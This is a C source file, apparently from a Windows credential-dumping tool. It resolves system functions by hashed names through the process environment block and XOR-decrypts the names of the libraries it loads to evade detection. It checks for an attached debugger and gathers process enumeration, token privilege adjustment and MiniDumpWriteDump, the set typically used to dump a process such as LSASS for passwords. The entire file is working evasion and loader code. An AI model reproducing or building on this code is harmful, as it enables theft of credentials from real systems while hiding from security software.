#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#include "CalcAPI.h"
#include "LoadAPI.h"
#include "Decryption.h"

BOOL loadApi(API_Call *APICall) {
	Kernel32_API* Kernel32Api = &(APICall->Kernel32Api);
	Advapi32_API* Advapi32Api = &(APICall->Advapi32Api);
	Dbghelp_API* DbghelpApi = &(APICall->DbghelpApi);

	char Advapi32DllStr[] = "\x08\x32\x07\x28\x26\x18\x7A\x64\x5F\x2D\x3A\x1D\x49";
	char DbghelpDllStr[] = "\x17\x03\x21\x29\x07\x3F\x37\x5D\x12\x2D\x1C\x50";


	const DWORD hash_kernel32_dll = 0x29cdd463;
	const DWORD hash_LoadLibraryA = 0xe96ce9ef;

	PPEB pPeb = get_peb();
	if (pPeb->BeingDebugged) {
		printf("	[X] Debugger Detected !!!\n");
		//return FALSE;
	}

	LoadLibraryA_F pLoadLibraryA =(LoadLibraryA_F) find_api(pPeb, hash_kernel32_dll, hash_LoadLibraryA);
	if(pLoadLibraryA == NULL)
		return FALSE;

	decryptionRoutine(Advapi32DllStr,13,"\x49\x56\x71\x00\x64\x70\x75\x66\x74\x56\x52\x6A\x5A");
	decryptionRoutine(DbghelpDllStr,12,"\x53\x61\x46\x41\x62\x53\x47\x73\x76\x41\x70\x50");


	Kernel32Api->CloseHandleF = (CloseHandle_F)find_api(pPeb,hash_kernel32_dll, 0xfef545);
	Kernel32Api->CreateFileAF = (CreateFileA_F)find_api(pPeb,hash_kernel32_dll, 0xe84b3a8e);
	Kernel32Api->GetCurrentProcessF = (GetCurrentProcess_F)find_api(pPeb,hash_kernel32_dll, 0xc75b7345);
	Kernel32Api->CreateToolhelp32SnapshotF = (CreateToolhelp32Snapshot_F)find_api(pPeb,hash_kernel32_dll, 0x9eb60b55);
	Kernel32Api->OpenProcessF = (OpenProcess_F)find_api(pPeb,hash_kernel32_dll, 0x74f0acb6);
	Kernel32Api->Process32FirstF = (Process32First_F)find_api(pPeb,hash_kernel32_dll, 0x454fc0f);
	Kernel32Api->Process32NextF = (Process32Next_F)find_api(pPeb,hash_kernel32_dll, 0xa1178452);
	if(Kernel32Api->CloseHandleF == NULL ||Kernel32Api->CreateFileAF == NULL ||Kernel32Api->GetCurrentProcessF == NULL ||Kernel32Api->CreateToolhelp32SnapshotF == NULL ||Kernel32Api->OpenProcessF == NULL ||Kernel32Api->Process32FirstF == NULL ||Kernel32Api->Process32NextF == NULL)
		return FALSE;

	if(pLoadLibraryA(Advapi32DllStr) != NULL) {
		const DWORD Advapi32Hash = 0x35c841f5;
		memset(Advapi32DllStr,0x00,13);
		Advapi32Api->LookupPrivilegeValueAF = (LookupPrivilegeValueA_F)find_api(pPeb,Advapi32Hash, 0x7206e77e);
		Advapi32Api->OpenProcessTokenF = (OpenProcessToken_F)find_api(pPeb,Advapi32Hash, 0x4296f923);
		Advapi32Api->AdjustTokenPrivilegesF = (AdjustTokenPrivileges_F)find_api(pPeb,Advapi32Hash, 0xc87f17a3);
		Advapi32Api->PrivilegeCheckF = (PrivilegeCheck_F)find_api(pPeb,Advapi32Hash, 0xd1152ac4);
		if(Advapi32Api->LookupPrivilegeValueAF == NULL ||Advapi32Api->OpenProcessTokenF == NULL ||Advapi32Api->AdjustTokenPrivilegesF == NULL ||Advapi32Api->PrivilegeCheckF == NULL)
			return FALSE;
	}else
		return FALSE;

	if(pLoadLibraryA(DbghelpDllStr) != NULL) {
		const DWORD DbghelpHash = 0x8f802b95;
		memset(DbghelpDllStr,0x00,12);
		DbghelpApi->MiniDumpWriteDumpF = (MiniDumpWriteDump_F)find_api(pPeb,DbghelpHash, 0x8d228a59);
		if(DbghelpApi->MiniDumpWriteDumpF == NULL)
			return FALSE;
	}else
		return FALSE;

	return TRUE;
}
